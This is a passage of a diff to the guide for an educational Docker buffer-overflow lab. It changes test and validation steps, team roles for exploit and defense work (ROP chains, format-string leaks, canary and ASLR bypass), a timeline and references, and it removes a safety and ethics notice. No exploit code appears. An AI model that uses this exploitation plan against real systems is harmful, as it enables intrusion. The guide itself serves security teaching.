-2. **Pattern offset (hex register)**: verifies little-endian hex values are decoded correctly
-3. **Unsafe copy marker**: confirms that a payload of the correct size replaces the return address with the marker
-4. **Canary detection**: verifies that overflow with canary enabled triggers abort
-5. **Bounded copy rejection**: confirms that oversized input is rejected before any copy occurs
-6. **Visualizer output**: verifies the rendered layout diff contains expected status strings
-
-### Lab Validation
-
-```bash
-python tools/validate_lab.py
-```
-
-### Docker Health Checks
-
-Each Docker service includes a health check:
-
-```bash
-docker compose ps    # Shows health status
-curl http://localhost:8080/health
-curl http://localhost:8081/health
-curl http://localhost:8082/health
-```
+1. **Build the environment**: `docker compose up --build -d`
+2. **Access attacker**: `docker exec -it attacker bash`
+3. **Validate exploitability**: Run `python3 scripts/03_exploit_level1.py`. If a shell interaction loop starts, the vulnerability is active.
+4. **Validate mitigation**: Run `python3 scripts/06_verify_safe.py`. The script will test all attack vectors (fuzzing, overflowing, format string injection) and must report them all as `BLOCKED`.
 
 ---
 
-## 13. Part J — Team Roles & Timeline
+## 11. Part H — Team Roles & Timeline
 
 ### Recommended Team Distribution (5 Members)
 
 | Role | Member | Responsibilities | Deliverables |
 |---|---|---|---|
-| **Team Lead & Exploit Developer** | #1 | Project management, attack implementation, exploit code | Attack walkthrough, exploit scripts |
-| **Infrastructure Engineer** | #2 | Docker setup, networking, CI/CD, environment | Docker configs, setup guide |
-| **Defense Analyst** | #3 | Study and implement all 5 mitigations | Mitigation report, safe server analysis |
-| **Bypass Specialist** | #4 | Demonstrate bypass of weak mitigation | Bypass writeup, demo script |
-| **Documentation & Bonus** | #5 | Comprehensive documentation, bonus research | This guide, bonus analysis, presentation |
+| **Project Lead** | (Name) | Coordination, Docker networking, final documentation review | Architecture diagram, `README.md` |
+| **Exploit Dev (Theory)** | (Name) | Levels 1 & 2 exploits (Fuzzing, Offset calculation, ROP chains) | `01_fuzzer.py`, `04_exploit_level2.py` |
+| **Exploit Dev (Advanced)** | (Name) | Level 3 exploits (Format string leaks, bypassing Canaries/ASLR) | `05_exploit_level3.py` |
+| **Defense Engineer** | (Name) | Writing `safe_server.c`, implementing compiler flags | `safe_server.c`, `06_verify_safe.py` |
+| **Security Analyst** | (Name) | Part H (Software types), research, presentation slides | Presentation, Part F documentation |
 
-### Suggested Timeline
+### Proposed Timeline (4 Weeks)
 
-| Week | Phase | Tasks | Deliverable |
-|---|---|---|---|
-| 1 | Setup & Theory | Install Docker, read theory, run buffer_lab | Working environment + theory notes |
-| 2 | Attack Phase | Run pentest lab, execute attack commands | Attack walkthrough document |
-| 3 | Defense Phase | Study 5 mitigations, analyze safe server | Mitigation comparison report |
-| 4 | Bypass Phase | Execute bypass demo, document technique | Bypass writeup + demo recording |
-| 5 | Bonus & Polish | Cross-platform analysis, final documentation | This guide + presentation slides |
+- **Week 1**: Environment setup, Docker configuration, Theory review (Parts A & B).
+- **Week 2**: Implementing `vuln_server.c`, fuzzing, and achieving the Level 1 `ret2shellcode` exploit.
+- **Week 3**: Advanced exploitation (ROP chains, Info leaks) for Levels 2 and 3.
+- **Week 4**: Securing the application (`safe_server.c`), writing final reports, preparing the presentation.
 
 ---
 
-## 14. References & Further Reading
+## 12. References & Further Reading
 
-### Academic & Industry Resources
-
-- OWASP Buffer Overflow: https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
-- CWE-120 Buffer Copy without Checking Size: https://cwe.mitre.org/data/definitions/120.html
-- Aleph One, "Smashing the Stack for Fun and Profit" (1996): http://phrack.org/issues/49/14.html
-- NIST CVE Database: https://nvd.nist.gov/
-
-### Hands-On Training Platforms
-
-- ROP Emporium (ROP chain exercises): https://ropemporium.com/
-- Exploit Education (Phoenix/Protostar): https://exploit.education/
-- OverTheWire Narnia: https://overthewire.org/wargames/narnia/
-
-### Tools Documentation
-
-- pwntools: https://docs.pwntools.com/
-- GDB GEF plugin: https://gef.readthedocs.io/
-- ROPgadget: https://github.com/JonathanSalwan/ROPgadget
-- checksec: https://github.com/slimm609/checksec.sh
-
-### Video Tutorials
-
-- LiveOverflow YouTube Channel: https://www.youtube.com/c/LiveOverflow
-- John Hammond: https://www.youtube.com/c/JohnHammond010
-
----
-
-## Safety & Ethics Notice
-
-This project is designed for **authorized educational use only**. All attacks are performed inside isolated Docker containers on a private network. Never apply these techniques against systems you do not own or have explicit written permission to test. Unauthorized computer access is a criminal offense in most jurisdictions.
-
----
-
-**Document Version**: 1.0
-**Last Updated**: May 2026
-**Repository**: https://github.com/samir22418/buffer_overflow
+- [Smashing The Stack For Fun And Profit (Aleph One)](http://phrack.org/issues/49/14.html) - The foundational paper on buffer overflows.
+- [ROPgadget Tool](https://github.com/JonathanSalwan/ROPgadget)
+- [Pwntools Documentation](https://docs.pwntools.com/)
+- [Pwndbg Features](https://github.com/pwndbg/pwndbg)
+- [CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer](https://cwe.mitre.org/data/definitions/119.html)
